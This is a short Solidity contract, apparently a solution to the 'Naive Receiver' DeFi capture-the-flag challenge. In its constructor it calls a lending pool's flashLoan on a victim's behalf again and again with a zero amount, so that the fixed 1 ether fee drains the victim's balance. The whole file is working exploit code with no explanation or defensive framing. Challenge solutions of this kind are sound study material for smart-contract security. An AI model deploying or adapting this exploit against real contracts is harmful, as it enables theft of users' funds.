// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}


contract NaiveReceiverAttack {
    uint256 private constant FIXED_FEE = 1 ether;

    constructor(address lenderPool, address victim) {
        // execute flash loan on behalf of the victim until all of the victim's funds are drained as fees
        while (victim.balance >= FIXED_FEE) {
            INaiveReceiverLenderPool(lenderPool).flashLoan(victim, 0);
        }
    }
}
